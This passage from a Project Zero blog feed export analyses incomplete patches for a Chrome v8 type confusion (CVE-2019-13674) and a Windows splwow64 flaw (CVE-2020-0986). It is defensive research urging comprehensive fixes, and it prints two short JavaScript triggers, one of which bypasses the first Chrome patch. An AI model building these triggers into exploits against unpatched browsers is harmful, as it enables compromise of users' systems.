href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-0968"&gt;CVE-2020-0968&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;in April 2020. We show the trigger in the section above.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.djf2g8z23hpx"&gt;&lt;span&gt;Google Chrome CVE-2019-13674&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromereleases.googleblog.com/2019/12/stable-channel-update-for-desktop.html"&gt;CVE-2019-13674&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in Chrome is an interesting case. When it was &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromium.googlesource.com/v8/v8/+/b8b6075021ade0969c6b8de9459cd34163f7dbe1"&gt;patched in November 2019&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, it was not known to be exploited in-the-wild. Instead, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1028863"&gt;it was reported by security researchers Soyeon Park and Wen Xu&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Three months later, in February 2020, Sergei Glazunov of Project Zero discovered that it was exploited in-the-wild, and may have been exploited as a 0-day prior to the patch. When Sergei realized it had already been patched, he decided to look a little closer at the patch. That&amp;rsquo;s when he realized that the patch didn&amp;rsquo;t fix all of the paths to trigger the vulnerability. To read about the vulnerability and the subsequent patches in greater detail, check out Sergei&amp;rsquo;s blog post, &amp;ldquo;&lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html"&gt;Chrome Infinity Bug&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;rdquo;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;To summarize, the vulnerability is a type confusion in Chrome&amp;rsquo;s v8 Javascript engine. The issue is in the function that is designed to compute the type of induction variables, the variable that gets increased or decreased by a fixed amount in each iteration of a loop, such as a &lt;/span&gt;&lt;span class="c23"&gt;for&lt;/span&gt;&lt;span&gt;&amp;nbsp;loop. The algorithm works only on v8&amp;rsquo;s integer type though. The integer type in v8 includes a few special values, &lt;/span&gt;&lt;span class="c23"&gt;+Infinity&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c23"&gt;-Infinity&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="c23"&gt;-0&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c23"&gt;NaN&lt;/span&gt;&lt;span&gt;&amp;nbsp;do not belong to the integer type though. Another interesting aspect to v8&amp;rsquo;s integer type is that it is not closed under addition meaning that adding two integers doesn&amp;rsquo;t always result in an integer. An example of this is &lt;/span&gt;&lt;span class="c23"&gt;+Infinity + -Infinity = NaN&lt;/span&gt;&lt;span class="c11 c4"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Therefore, the following line is sufficient to &lt;/span&gt;&lt;span&gt;trigger&lt;/span&gt;&lt;span&gt;&amp;nbsp;CVE-2019-13674. Note that this line will not show any observable crash effects and the road to making this vulnerability exploitable is quite long, check out &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/"&gt;this blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;if you&amp;rsquo;re interested! &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.a9314e9b2bd8b19d1e18395634993f466fea284a"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;Infinity&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;+=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;Infinity&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromium.googlesource.com/v8/v8.git/+/b8b6075021ade0969c6b8de9459cd34163f7dbe1"&gt;The patch&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that Chrome released for this vulnerability added an explicit check for the &lt;/span&gt;&lt;span class="c23"&gt;NaN&lt;/span&gt;&lt;span&gt;&amp;nbsp;case. But the patch made an assumption that leads to it being insufficient: that the loop variable can only become &lt;/span&gt;&lt;span class="c23"&gt;NaN&lt;/span&gt;&lt;span&gt;&amp;nbsp;if the sum or difference of the initial value of the variable and the increment is &lt;/span&gt;&lt;span class="c23"&gt;NaN&lt;/span&gt;&lt;span class="c11 c4"&gt;. The issue is that the value of the increment can change inside the loop body. Therefore the following trigger would still work even after the patch was applied.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9eb676d3c545b8bdcea88fbbc80c4de5301054de"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;increment &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;Infinity&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;k &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// The initial loop value is 0 and the increment is -Infinity.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// This is permissible because 0 + -Infinity = -Infinity, an integer.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;+=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;increment&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;i &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;-&lt;/span&gt;&lt;span class="c6"&gt;Infinity&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// Once the initial variable equals -Infinity (one loop through)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;// the increment is changed to +Infinity. -Infinity + +Infinity = NaN&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; increment &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c6"&gt;Infinity&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(++&lt;/span&gt;&lt;span class="c2"&gt;k &lt;/span&gt;&lt;span class="c1"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;10&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;break&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;To &amp;ldquo;revive&amp;rdquo; the entire exploit, the attacker only needed to change a couple of lines in the trigger to have another working 0-day. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017"&gt;This incomplete fix was reported&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Chrome in February 2020. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromium.googlesource.com/v8/v8.git/+/a2e971c56d1c46f7c71ccaf33057057308cc8484"&gt;This patch&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was more conservative: it bailed as soon as the type detected that increment can be &lt;/span&gt;&lt;span class="c23"&gt;+Infinity&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class="c23"&gt;-Infinity&lt;/span&gt;&lt;span class="c11 c4"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Unfortunately, this patch introduced an additional security vulnerability, which allowed for a wider choice of possible &amp;ldquo;type confusions&amp;rdquo;. Again, check out &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html"&gt;Sergei&amp;rsquo;s blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;if you&amp;rsquo;re interested in more details. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;This is an example where the exploit is found &lt;/span&gt;&lt;span class="c31"&gt;after&lt;/span&gt;&lt;span&gt;&amp;nbsp;the bug was initially reported by security researchers. As an aside, I&lt;/span&gt;&lt;span&gt;&amp;nbsp;think this shows why it&amp;rsquo;s important to work towards &amp;ldquo;correct &amp;amp; comprehensive&amp;rdquo; patches in general, not just vulnerabilities known to be exploited in-the-wild. &lt;/span&gt;&lt;span&gt;The security industry &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html"&gt;knows there is a detection gap&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;in our ability to detect 0-days exploited in-the-wild. We don&amp;rsquo;t find and detect all exploited 0-days and we certainly don&amp;rsquo;t find them all in a timely manner. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.n50yx180dgki"&gt;&lt;span class="c33 c4"&gt;Windows splwow64 CVE-2020-0986&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;This vulnerability has already been discussed in the previous section on variants. After &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/"&gt;Kaspersky reported that CVE-2020-0986 was actively exploited&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;as a 0-day, I began performing root cause analysis and variant analysis on the vulnerability. The vulnerability was patched in June 2020, but it was only&lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/"&gt;&amp;nbsp;disclosed as exploited in-the-wild in August 2020&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Microsoft&amp;rsquo;s patch for CVE-2020-0986 replaced the raw pointers that an attacker could previously send through the LPC message, with offsets. This didn&amp;rsquo;t fix the root cause vulnerability, just changed how an attacker would trigger the vulnerability. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2096"&gt;This issue was reported&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Microsoft in September 2020, including a working trigger. Microsoft released a more complete patch for the vulnerability in January 2021, four months later. This new patch checks that all &lt;/span&gt;&lt;span class="c23"&gt;memcpy&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;operations are only reading from and copying into the buffer of the message.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c3 c9" id="h.3yn8y6vmd87d"&gt;&lt;span class="c4 c27"&gt;Correct and comprehensive patches&lt;/span&gt;&lt;/h1&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;We&amp;rsquo;ve detailed how six 0-days that were exploited in-the-wild in 2020 were closely related to vulnerabilities that had been seen previously.&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;We also showed how three vulnerabilities that were exploited in-the-wild were either not fixed correctly or not fixed comprehensively when patched this year. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;When 0-day exploits are detected in-the-wild, it&amp;rsquo;s the failure case for an attacker. It&amp;rsquo;s a gift for us security defenders to learn as much as we can and take actions to ensure that that vector can&amp;rsquo;t be used again. The goal is to force attackers to start from scratch each time we detect one of their exploits: &lt;/span&gt;&lt;span&gt;they&amp;rsquo;re forced to discover a whole new vulnerability&lt;/span&gt;&lt;span class="c11 c4"&gt;, they have to invest the time in learning and analyzing a new attack surface, they must develop a brand new exploitation method. To do that, we need correct and comprehensive fixes. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Being able to &lt;/span&gt;&lt;span&gt;correctly and comprehensively patch isn&amp;#39;t just flicking a switch: it requires investment, prioritization, and planning. It also requires developing a patching process that balances both protecting users quickly and ensuring it is comprehensive, which can at times be in tension. While we expect that none of this will come as a surprise to security teams in an organization, this analysis is a good reminder that there is still more work to be done.&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;Exactly what investments are likely required depends on each unique situation, but we see some common themes around staffing/resourcing, incentive structures, process maturity, automation/testing, release cadence, and partnerships.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;While the aim is that one day all vulnerabilities will be fixed correctly &lt;/span&gt;&lt;span class="c31"&gt;and&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;comprehensively, each step we take in that direction will make it harder for attackers to exploit 0-days.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In 2021, Project Zero will continue completing root cause and variant analyses for vulnerabilities reported as in-the-wild. We will also be looking over the patches for these exploited vulnerabilities with more scrutiny. We hope to also expand our work into variant analysis work on other vulnerabilities as well. We hope more researchers will join us in this work. (If you&amp;rsquo;re an aspiring vulnerability researcher, variant analysis could be a great way to begin building your skills! Here are two conference talks on the topic: &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://www.youtube.com/watch?v=mC1Pwsdy814"&gt;my talk at BluehatIL 2020&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://www.youtube.com/watch?v=fTNzylTMYks"&gt;Ki Chan Ahn at OffensiveCon 2020&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;.)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In addition, we would really like to work more closely with vendors on patches and mitigations &lt;/span&gt;&lt;span class="c31"&gt;prior&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;to the patch being released. We often have ideas of how issues can be addressed. Early collaboration and offering feedback during the patch design and implementation process is good for everyone. Researchers and vendors alike can save time, resources, and energy by working together, rather than patch diffing a binary after release and realizing the vulnerability was not completely fixed.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/2386590713508572091/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2386590713508572091" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/2386590713508572091" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html" title="Déjà vu-lnerability" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-405547501763334781</id>
    <published>2021-01-28T11:47:00.003-08:00</published>
    <updated>2021-09-09T10:52:46.859-07:00</updated>
    <title type="text">A Look at iMessage in iOS 14</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6Ae_NZQ7StBcqH_vXVqoPMX0');ol.lst-kix_ezf2mrk385uq-4.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-4 0}ol.lst-kix_ct3zb543qdjl-5{list-style-type:none}ol.lst-kix_ct3zb543qdjl-4{list-style-type:none}ol.lst-kix_ct3zb543qdjl-7{list-style-type:none}ol.lst-kix_ct3zb543qdjl-6{list-style-type:none}ol.lst-kix_ct3zb543qdjl-1{list-style-type:none}ol.lst-kix_ct3zb543qdjl-0{list-style-type:none}ol.lst-kix_ct3zb543qdjl-3{list-style-type:none}ol.lst-kix_ct3zb543qdjl-2{list-style-type:none}ol.lst-kix_aue93cd1tacp-8{list-style-type:none}.lst-kix_ezf2mrk385uq-8&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-8}ol.lst-kix_ha0mdd7f5mn8-8.start{counter-reset:lst-ctn-kix_ha0mdd7f5mn8-8 0}ol.lst-kix_hisa166i97g-1.start{counter-reset:lst-ctn-kix_hisa166i97g-1 0}ol.lst-kix_ct3zb543qdjl-8{list-style-type:none}.lst-kix_f1zwtsa21lze-6&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-6}ol.lst-kix_aue93cd1tacp-6.start{counter-reset:lst-ctn-kix_aue93cd1tacp-6 0}ol.lst-kix_2zj51yim977x-4.start{counter-reset:lst-ctn-kix_2zj51yim977x-4 0}ol.lst-kix_ct3zb543qdjl-5.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-5 0}.lst-kix_aue93cd1tacp-8&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-8}.lst-kix_ezf2mrk385uq-4&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-4}.lst-kix_hmo7gyj5poo-3&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-3}ol.lst-kix_aue93cd1tacp-3{list-style-type:none}ol.lst-kix_aue93cd1tacp-2{list-style-type:none}ol.lst-kix_aue93cd1tacp-1{list-style-type:none}ol.lst-kix_aue93cd1tacp-0{list-style-type:none}.lst-kix_hisa166i97g-0&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-0}ol.lst-kix_aue93cd1tacp-7{list-style-type:none}ol.lst-kix_aue93cd1tacp-6{list-style-type:none}ol.lst-kix_aue93cd1tacp-5{list-style-type:none}ol.lst-kix_aue93cd1tacp-4{list-style-type:none}ol.lst-kix_hisa166i97g-6.start{counter-reset:lst-ctn-kix_hisa166i97g-6 0}ol.lst-kix_ct3zb543qdjl-0.start{counter-reset:lst-ctn-kix_ct3zb543qdjl-0 0}ol.lst-kix_aue93cd1tacp-1.start{counter-reset:lst-ctn-kix_aue93cd1tacp-1 0}ol.lst-kix_hmo7gyj5poo-4.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-4 0}.lst-kix_ju6nxsiwjdzc-0&gt;li:before{content:"\0025cf  "}.lst-kix_33m87cusbobo-0&gt;li:before{content:"\0025cf  "}.lst-kix_ct3zb543qdjl-2&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-2}.lst-kix_ha0mdd7f5mn8-1&gt;li:before{content:"" counter(lst-ctn-kix_ha0mdd7f5mn8-1,lower-latin) ") "}.lst-kix_ha0mdd7f5mn8-3&gt;li:before{content:"(" counter(lst-ctn-kix_ha0mdd7f5mn8-3,decimal) ") "}.lst-kix_ju6nxsiwjdzc-1&gt;li:before{content:"\0025cb  "}.lst-kix_33m87cusbobo-2&gt;li:before{content:"\0025a0  "}.lst-kix_hmo7gyj5poo-6&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-6,decimal) ". "}.lst-kix_hmo7gyj5poo-6&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-6}.lst-kix_hmo7gyj5poo-4&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-4,lower-latin) ". "}.lst-kix_hmo7gyj5poo-8&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-8,lower-roman) ". "}.lst-kix_ju6nxsiwjdzc-3&gt;li:before{content:"\0025cf  "}.lst-kix_33m87cusbobo-4&gt;li:before{content:"\0025cb  "}.lst-kix_ju6nxsiwjdzc-5&gt;li:before{content:"\0025a0  "}.lst-kix_hisa166i97g-3&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-3}.lst-kix_33m87cusbobo-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_ezf2mrk385uq-8{list-style-type:none}.lst-kix_ju6nxsiwjdzc-7&gt;li:before{content:"\0025cb  "}.lst-kix_33m87cusbobo-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_ezf2mrk385uq-6{list-style-type:none}.lst-kix_ezf2mrk385uq-0&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-0}ol.lst-kix_ezf2mrk385uq-7{list-style-type:none}ol.lst-kix_ezf2mrk385uq-4{list-style-type:none}ol.lst-kix_ezf2mrk385uq-5{list-style-type:none}ol.lst-kix_ezf2mrk385uq-2{list-style-type:none}ol.lst-kix_ezf2mrk385uq-3{list-style-type:none}ol.lst-kix_ezf2mrk385uq-0{list-style-type:none}ol.lst-kix_ezf2mrk385uq-1{list-style-type:none}.lst-kix_ha0mdd7f5mn8-7&gt;li:before{content:"" counter(lst-ctn-kix_ha0mdd7f5mn8-7,lower-latin) ". "}.lst-kix_ha0mdd7f5mn8-5&gt;li:before{content:"(" counter(lst-ctn-kix_ha0mdd7f5mn8-5,lower-roman) ") "}.lst-kix_ct3zb543qdjl-1&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-1}ol.lst-kix_ezf2mrk385uq-6.start{counter-reset:lst-ctn-kix_ezf2mrk385uq-6 0}ol.lst-kix_f1zwtsa21lze-6.start{counter-reset:lst-ctn-kix_f1zwtsa21lze-6 0}.lst-kix_2zj51yim977x-2&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-2}.lst-kix_mqtiiergx266-0&gt;li:before{content:"\0025cf  "}.lst-kix_mqtiiergx266-4&gt;li:before{content:"\0025cb  "}.lst-kix_yvc47pi19nhn-4&gt;li:before{content:"\0025cb  "}.lst-kix_yvc47pi19nhn-8&gt;li:before{content:"\0025a0  "}.lst-kix_u10h5r66zlog-4&gt;li:before{content:"\0025cb  "}.lst-kix_mqtiiergx266-2&gt;li:before{content:"\0025a0  "}.lst-kix_yvc47pi19nhn-2&gt;li:before{content:"\0025a0  "}.lst-kix_yvc47pi19nhn-0&gt;li:before{content:"\0025cf  "}.lst-kix_2zj51yim977x-3&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-3}.lst-kix_u10h5r66zlog-6&gt;li:before{content:"\0025cf  "}.lst-kix_gavezx7jyt0h-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_hisa166i97g-4.start{counter-reset:lst-ctn-kix_hisa166i97g-4 0}.lst-kix_u10h5r66zlog-8&gt;li:before{content:"\0025a0  "}.lst-kix_gavezx7jyt0h-6&gt;li:before{content:"\0025cf  